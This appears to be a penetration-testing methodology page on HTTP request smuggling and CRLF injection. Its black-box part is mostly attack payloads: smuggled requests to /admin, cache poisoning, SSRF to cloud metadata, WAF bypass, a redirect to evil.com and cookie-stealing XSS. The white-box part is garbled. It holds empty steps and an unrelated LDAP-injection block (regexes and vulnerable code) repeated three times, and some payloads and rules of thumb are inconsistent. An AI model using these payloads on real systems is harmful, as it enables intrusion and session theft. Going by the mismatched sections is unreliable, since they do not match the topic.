# HTTP Splitting Smuggling

## Check List

## Methodology

### Black Box

#### [HRS With Content-Length And Transfer-Encoding](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling#clte-vulnerabilities)

{% stepper %}
{% step %}
Inject conflicting Content-Length and Transfer-Encoding headers to test for desync

```http
POST /path HTTP/1.1
Host: target.com
Content-Length: 50
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
```
{% endstep %}

{% step %}
Check if the response indicates the backend processed the smuggled `GET /admin` request
{% endstep %}
{% endstepper %}

***

#### [HTTP/2 To HTTP/1.1 Downgrade](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling#http2-request-smuggling)

{% stepper %}
{% step %}
If the site supports HTTP/2, force a downgrade to HTTP/1.1 with a smuggling payload

```http
POST /path HTTP/2
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
```
{% endstep %}

{% step %}
Verify if the backend executes the smuggled GET /admin request
{% endstep %}
{% endstepper %}

***

#### [Multi-Chunked Smuggling](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Request%20Smuggling#tete-vulnerabilities)

{% stepper %}
{% step %}
Inject multiple Transfer-Encoding headers to confuse proxy parsing

```http
POST /path HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
```
{% endstep %}

{% step %}
Check if the smuggled request is processed by the backend
{% endstep %}
{% endstepper %}

***

#### Invalid TE Header Manipulation

{% stepper %}
{% step %}
Use malformed Transfer-Encoding headers to bypass validation

```http
POST /path HTTP/1.1
Host: vulnerable.com
Transfer-Encoding: cHuNkEd
Content-Length: 60

0
GET /admin HTTP/1.1
```
{% endstep %}

{% step %}
Verify if the response includes evidence of the smuggled request
{% endstep %}
{% endstepper %}

***

#### Cache Poisoning With HRS

{% stepper %}
{% step %}
Inject a payload to poison the CDN cache

```http
POST /path HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 60

0
GET /index.html HTTP/1.1
X-Cache-Inject: evil.js
```
{% endstep %}

{% step %}
Check if the cache serves evil.js to subsequent users
{% endstep %}
{% endstepper %}

***

#### SSRF With HRS

{% stepper %}
{% step %}
Smuggle a payload to access internal services

```http
POST /path HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 60

0
GET http://169.254.169.254/latest/meta-data/ HTTP/1.1
```
{% endstep %}

{% step %}
Verify if the response contains internal metadata (AWS metadata)
{% endstep %}
{% endstepper %}

***

#### WAF Bypass With HRS

{% stepper %}
{% step %}
Split payloads to evade WAF detection

```http
POST /path HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
X-Bypass: evasion

0
GET /secret HTTP/1.1
```
{% endstep %}

{% step %}
Check if the smuggled request bypasses the WAF and reaches the backend
{% endstep %}
{% endstepper %}

***

#### Blind HRS

{% stepper %}
{% step %}
Inject a time-delayed payload to detect blind smuggling

```http
POST /path HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 40

0
GET /admin HTTP/1.1
```
{% endstep %}

{% step %}
Measure response delays to infer smuggling success
{% endstep %}
{% endstepper %}

***

#### Multi-Hop Proxy Smuggling

{% stepper %}
{% step %}
Inject payloads across a chain of proxies (CDN → Load Balancer → Backend)

```http
POST /path HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Content-Length: 60

0
GET /admin HTTP/1.1
```
{% endstep %}

{% step %}
Trace the smuggled request across each hop and check for discrepancies in processing
{% endstep %}
{% endstepper %}

***

#### [Basic CRLF Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection#carriage-return-line-feed)

{% stepper %}
{% step %}
Modify the query parameter by injecting a CRLF sequence to add a custom header

```http
GET /page?input=home%0d%0aSet-Cookie:crlf=injected
```
{% endstep %}

{% step %}
Check the response headers for the injected Set-Cookie: crlf=injected. If present, the endpoint is vulnerable

{% hint style="info" %}
The important thing is that if you inject the payload and get a 400 in response, it can indicate that the server is vulnerable, but if it gives a 404 in response, it means that the server is not vulnerable
{% endhint %}
{% endstep %}
{% endstepper %}

***

#### [Cookie Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection#session-fixation)

{% stepper %}
{% step %}
Inject a CRLF sequence to manipulate cookies

```http
GET /page?input=home%0d%0aSet-Cookie:hacked=true
```
{% endstep %}

{% step %}
Verify if the response includes the injected cookie `(hacked=true)` or affects session behavior
{% endstep %}
{% endstepper %}

***

#### [Redirection/phishing](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection#open-redirect)

{% stepper %}
{% step %}
CRLF Injection can be used to inject links that redirect users to phishing sites

```http
%0d%0a%0d%0a%3CA%20HREF%3D%22https%3A%2F%2Fexample.com%2F%22%3ELogin%20Here%20%3C%2FA%3E%0A%0A
```
{% endstep %}

{% step %}
Observe if the browser redirects to phishing page
{% endstep %}
{% endstepper %}

***

#### [Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection#open-redirect)

{% stepper %}
{% step %}
Inject a Location header to redirect to a malicious site

```http
GET /page?input=home%0d%0aLocation:https://evil.com
```
{% endstep %}

{% step %}
Observe if the browser redirects to https://evil.com
{% endstep %}
{% endstepper %}

***

#### HTTP Response Splitting

{% stepper %}
{% step %}
By injecting %0d%0a (Carriage Return + Line Feed), an attacker can split the server’s HTTP response into two parts. This enables manipulation of headers and body content in unexpected ways

```http
/vulnerable-endpoint?q=abc%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert('Unk9vvN!')</script>
```
{% endstep %}

{% step %}
`%0d%0a` → Ends the current header line and A new `HTTP/1.1 200` OK response starts with a malicious script in the body
{% endstep %}
{% endstepper %}

***

#### [Test XSS Protection Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection#cross-site-scripting)

{% stepper %}
{% step %}
Inject a payload to disable XSS protections and execute JavaScript

```http
GET /page?input=home%0d%0aX-XSS-Protection:0%0d%0a%0d%0a%3Cscript%3Ealert(document.cookie)%3C/script%3E
```
{% endstep %}

{% step %}
Verify if the response includes X-XSS-Protection: 0 and the script executes
{% endstep %}
{% endstepper %}

***

#### [Test GBK-Encoded CRLF Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection#filter-bypass)

{% stepper %}
{% step %}
If standard CRLF payloads are blocked, use GBK-encoded characters

```
GET /page?input=home%E5%98%8D%E5%98%8ASet-Cookie:crlfinjection=unk9vvn
```
{% endstep %}

{% step %}
Check if the response includes the injected Set-Cookie: crlfinjection=unk9vvn
{% endstep %}
{% endstepper %}

***

#### [CRLF Injection Using cURL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection)

{% stepper %}
{% step %}
Test for CRLF Injection using cURL

```
curl -I "https://target.com/page?input=home%0d%0aSet-Cookie:crlf=injected"
```
{% endstep %}

{% step %}
Check the response headers for set-cookie: crlf=injected

```http
HTTP/2 301
date: Mon, 12 May 2025 12:46:42 GMT
content-type: text/html
location: https://example.com/
set-cookie: crlf=injected; -> vulnerability
```
{% endstep %}
{% endstepper %}

***

#### CRLF Header Injection Via "redirect\_uri" Parameter

{% stepper %}
{% step %}
Log in to the target site and review the authentication process
{% endstep %}

{% step %}
Then check whether the authentication process is performed using Oauth or not
{% endstep %}

{% step %}
If Oauth is used then get the `redirect_uri` parameter in the Burp Suite request and send it to the repeater
{% endstep %}

{% step %}
Then test the CRLF Injection tests in this parameter, like below

```
https://subdomain.example.com/oauth/authorize?client_id=&redirect_uri=%0d%0axxx:something&response_type=code
```
{% endstep %}

{% step %}
Then send the request and inspect the HTTP responses. If you see the following injected value, the vulnerability is confirmed

```http
location: xxx:something?error=invalid_scope
```
{% endstep %}
{% endstepper %}

***

### White Box

{% stepper %}
{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}


**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:Filter\s*=\s*\$?".*\(objectClass=user\).*\{|\bFilter\s*=\s*.*\+\s*[a-zA-Z_][a-zA-Z0-9_]*|SearchRequest\s*\([^)]*Filter\s*=|DirectorySearcher\s*\{[\s\S]{0,120}?Filter\s*=)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:searchFilter\s*=\s*".*\(objectClass=user\).*\+\s*|new\s+SearchControls|DirContext\.search\s*\(|LdapQueryBuilder[\s\S]{0,120}?filter)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:ldap_search\s*\(.*['"]\s*\.\s*(?:str_replace|addslashes)?\s*\(?\$|ldap_search\s*\(.*\$filter|ldap_list\s*\(.*\$filter)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:filter:\s*`.*\(objectClass=user\).*\$\{|filter\s*:\s*['"].*\+\s*[a-zA-Z_]|client\.search\s*\(|ldapjs[\s\S]{0,120}?filter)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Filter\s*=.*\(objectClass=user\).*\{|Filter\s*=.*\+.*|DirectorySearcher.*Filter
```
{% endtab %}

{% tab title="Java" %}
```regexp
searchFilter\s*=.*\(objectClass=user\).*\+|DirContext\.search\(|LdapQueryBuilder.*filter
```
{% endtab %}

{% tab title="PHP" %}
```regexp
ldap_search\(.*\$filter|ldap_search\(.*str_replace|ldap_list\(.*\$filter
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
filter:\s*`.*\$\{|filter\s*:\s*['"].*\+|client\.search\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class SamlProvisioningService 
{
    private readonly LdapConnection _ldapConnection;

    public async Task<List<string>> HydrateUserRolesAsync(SamlAssertion assertion) 
    {
        // [1]
        var departmentClaim = assertion.GetClaim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/department");

        // [2]
        // [3]
        // [4]
        var searchFilter = $"(&(objectClass=user)(department={departmentClaim}))";
        
        var request = new SearchRequest("DC=enterprise,DC=local", searchFilter, SearchScope.Subtree, "memberOf");
        var response = (SearchResponse)await Task.Factory.FromAsync(_ldapConnection.BeginSendRequest, _ldapConnection.EndSendRequest, request, null);

        return ExtractRolesFromLdapResponse(response);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class SamlProvisioningService {

    @Autowired
    private LdapTemplate ldapTemplate;

    public List<String> hydrateUserRoles(SamlAssertion assertion) {
        // [1]
        String departmentClaim = assertion.getAttribute("Department");

        // [2]
        // [3]
        // [4]
        String searchFilter = "(&(objectClass=user)(department=" + departmentClaim + "))";
        
        List<String> roles = ldapTemplate.search(
            query().base("DC=enterprise,DC=local").filter(searchFilter),
            (AttributesMapper<String>) attrs -> (String) attrs.get("memberOf").get()
        );

        return roles;
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class SamlProvisioningService 
{
    protected $ldapConnection;

    public function hydrateUserRoles(SamlAssertion $assertion): array 
    {
        // [1]
        $departmentClaim = $assertion->getAttribute('Department');

        // [2]
        // [3]
        // [4]
        $searchFilter = "(&(objectClass=user)(department={$departmentClaim}))";
        
        $search = ldap_search($this->ldapConnection, "DC=enterprise,DC=local", $searchFilter, ['memberOf']);
        $entries = ldap_get_entries($this->ldapConnection, $search);

        return $this->extractRoles($entries);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class SamlProvisioningService {
    static async hydrateUserRoles(assertion) {
        // [1]
        let departmentClaim = assertion.attributes['Department'];

        // [2]
        // [3]
        // [4]
        let searchFilter = `(&(objectClass=user)(department=${departmentClaim}))`;

        let opts = {
            filter: searchFilter,
            scope: 'sub',
            attributes: ['memberOf']
        };

        return new Promise((resolve, reject) => {
            ldapClient.search('DC=enterprise,DC=local', opts, (err, res) => {
                let roles = [];
                res.on('searchEntry', (entry) => roles.push(entry.object.memberOf));
                res.on('end', () => resolve(roles));
                res.on('error', (err) => reject(err));
            });
        });
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}
{% endstepper %}

***

{% stepper %}
{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}


**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:Filter\s*=\s*\$?".*\(objectClass=user\).*\{|\bFilter\s*=\s*.*\+\s*[a-zA-Z_][a-zA-Z0-9_]*|SearchRequest\s*\([^)]*Filter\s*=|DirectorySearcher\s*\{[\s\S]{0,120}?Filter\s*=)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:searchFilter\s*=\s*".*\(objectClass=user\).*\+\s*|new\s+SearchControls|DirContext\.search\s*\(|LdapQueryBuilder[\s\S]{0,120}?filter)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:ldap_search\s*\(.*['"]\s*\.\s*(?:str_replace|addslashes)?\s*\(?\$|ldap_search\s*\(.*\$filter|ldap_list\s*\(.*\$filter)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:filter:\s*`.*\(objectClass=user\).*\$\{|filter\s*:\s*['"].*\+\s*[a-zA-Z_]|client\.search\s*\(|ldapjs[\s\S]{0,120}?filter)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Filter\s*=.*\(objectClass=user\).*\{|Filter\s*=.*\+.*|DirectorySearcher.*Filter
```
{% endtab %}

{% tab title="Java" %}
```regexp
searchFilter\s*=.*\(objectClass=user\).*\+|DirContext\.search\(|LdapQueryBuilder.*filter
```
{% endtab %}

{% tab title="PHP" %}
```regexp
ldap_search\(.*\$filter|ldap_search\(.*str_replace|ldap_list\(.*\$filter
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
filter:\s*`.*\$\{|filter\s*:\s*['"].*\+|client\.search\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class SamlProvisioningService 
{
    private readonly LdapConnection _ldapConnection;

    public async Task<List<string>> HydrateUserRolesAsync(SamlAssertion assertion) 
    {
        // [1]
        var departmentClaim = assertion.GetClaim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/department");

        // [2]
        // [3]
        // [4]
        var searchFilter = $"(&(objectClass=user)(department={departmentClaim}))";
        
        var request = new SearchRequest("DC=enterprise,DC=local", searchFilter, SearchScope.Subtree, "memberOf");
        var response = (SearchResponse)await Task.Factory.FromAsync(_ldapConnection.BeginSendRequest, _ldapConnection.EndSendRequest, request, null);

        return ExtractRolesFromLdapResponse(response);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class SamlProvisioningService {

    @Autowired
    private LdapTemplate ldapTemplate;

    public List<String> hydrateUserRoles(SamlAssertion assertion) {
        // [1]
        String departmentClaim = assertion.getAttribute("Department");

        // [2]
        // [3]
        // [4]
        String searchFilter = "(&(objectClass=user)(department=" + departmentClaim + "))";
        
        List<String> roles = ldapTemplate.search(
            query().base("DC=enterprise,DC=local").filter(searchFilter),
            (AttributesMapper<String>) attrs -> (String) attrs.get("memberOf").get()
        );

        return roles;
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class SamlProvisioningService 
{
    protected $ldapConnection;

    public function hydrateUserRoles(SamlAssertion $assertion): array 
    {
        // [1]
        $departmentClaim = $assertion->getAttribute('Department');

        // [2]
        // [3]
        // [4]
        $searchFilter = "(&(objectClass=user)(department={$departmentClaim}))";
        
        $search = ldap_search($this->ldapConnection, "DC=enterprise,DC=local", $searchFilter, ['memberOf']);
        $entries = ldap_get_entries($this->ldapConnection, $search);

        return $this->extractRoles($entries);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class SamlProvisioningService {
    static async hydrateUserRoles(assertion) {
        // [1]
        let departmentClaim = assertion.attributes['Department'];

        // [2]
        // [3]
        // [4]
        let searchFilter = `(&(objectClass=user)(department=${departmentClaim}))`;

        let opts = {
            filter: searchFilter,
            scope: 'sub',
            attributes: ['memberOf']
        };

        return new Promise((resolve, reject) => {
            ldapClient.search('DC=enterprise,DC=local', opts, (err, res) => {
                let roles = [];
                res.on('searchEntry', (entry) => roles.push(entry.object.memberOf));
                res.on('end', () => resolve(roles));
                res.on('error', (err) => reject(err));
            });
        });
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}
{% endstepper %}

***

{% stepper %}
{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}

{% step %}


**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:Filter\s*=\s*\$?".*\(objectClass=user\).*\{|\bFilter\s*=\s*.*\+\s*[a-zA-Z_][a-zA-Z0-9_]*|SearchRequest\s*\([^)]*Filter\s*=|DirectorySearcher\s*\{[\s\S]{0,120}?Filter\s*=)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:searchFilter\s*=\s*".*\(objectClass=user\).*\+\s*|new\s+SearchControls|DirContext\.search\s*\(|LdapQueryBuilder[\s\S]{0,120}?filter)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:ldap_search\s*\(.*['"]\s*\.\s*(?:str_replace|addslashes)?\s*\(?\$|ldap_search\s*\(.*\$filter|ldap_list\s*\(.*\$filter)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:filter:\s*`.*\(objectClass=user\).*\$\{|filter\s*:\s*['"].*\+\s*[a-zA-Z_]|client\.search\s*\(|ldapjs[\s\S]{0,120}?filter)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Filter\s*=.*\(objectClass=user\).*\{|Filter\s*=.*\+.*|DirectorySearcher.*Filter
```
{% endtab %}

{% tab title="Java" %}
```regexp
searchFilter\s*=.*\(objectClass=user\).*\+|DirContext\.search\(|LdapQueryBuilder.*filter
```
{% endtab %}

{% tab title="PHP" %}
```regexp
ldap_search\(.*\$filter|ldap_search\(.*str_replace|ldap_list\(.*\$filter
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
filter:\s*`.*\$\{|filter\s*:\s*['"].*\+|client\.search\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class SamlProvisioningService 
{
    private readonly LdapConnection _ldapConnection;

    public async Task<List<string>> HydrateUserRolesAsync(SamlAssertion assertion) 
    {
        // [1]
        var departmentClaim = assertion.GetClaim("http://schemas.xmlsoap.org/ws/2005/05/identity/claims/department");

        // [2]
        // [3]
        // [4]
        var searchFilter = $"(&(objectClass=user)(department={departmentClaim}))";
        
        var request = new SearchRequest("DC=enterprise,DC=local", searchFilter, SearchScope.Subtree, "memberOf");
        var response = (SearchResponse)await Task.Factory.FromAsync(_ldapConnection.BeginSendRequest, _ldapConnection.EndSendRequest, request, null);

        return ExtractRolesFromLdapResponse(response);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Service
public class SamlProvisioningService {

    @Autowired
    private LdapTemplate ldapTemplate;

    public List<String> hydrateUserRoles(SamlAssertion assertion) {
        // [1]
        String departmentClaim = assertion.getAttribute("Department");

        // [2]
        // [3]
        // [4]
        String searchFilter = "(&(objectClass=user)(department=" + departmentClaim + "))";
        
        List<String> roles = ldapTemplate.search(
            query().base("DC=enterprise,DC=local").filter(searchFilter),
            (AttributesMapper<String>) attrs -> (String) attrs.get("memberOf").get()
        );

        return roles;
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class SamlProvisioningService 
{
    protected $ldapConnection;

    public function hydrateUserRoles(SamlAssertion $assertion): array 
    {
        // [1]
        $departmentClaim = $assertion->getAttribute('Department');

        // [2]
        // [3]
        // [4]
        $searchFilter = "(&(objectClass=user)(department={$departmentClaim}))";
        
        $search = ldap_search($this->ldapConnection, "DC=enterprise,DC=local", $searchFilter, ['memberOf']);
        $entries = ldap_get_entries($this->ldapConnection, $search);

        return $this->extractRoles($entries);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class SamlProvisioningService {
    static async hydrateUserRoles(assertion) {
        // [1]
        let departmentClaim = assertion.attributes['Department'];

        // [2]
        // [3]
        // [4]
        let searchFilter = `(&(objectClass=user)(department=${departmentClaim}))`;

        let opts = {
            filter: searchFilter,
            scope: 'sub',
            attributes: ['memberOf']
        };

        return new Promise((resolve, reject) => {
            ldapClient.search('DC=enterprise,DC=local', opts, (err, res) => {
                let roles = [];
                res.on('searchEntry', (entry) => roles.push(entry.object.memberOf));
                res.on('end', () => resolve(roles));
                res.on('error', (err) => reject(err));
            });
        });
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}

{% endstep %}

{% step %}

{% endstep %}
{% endstepper %}

***

## Cheat Sheet
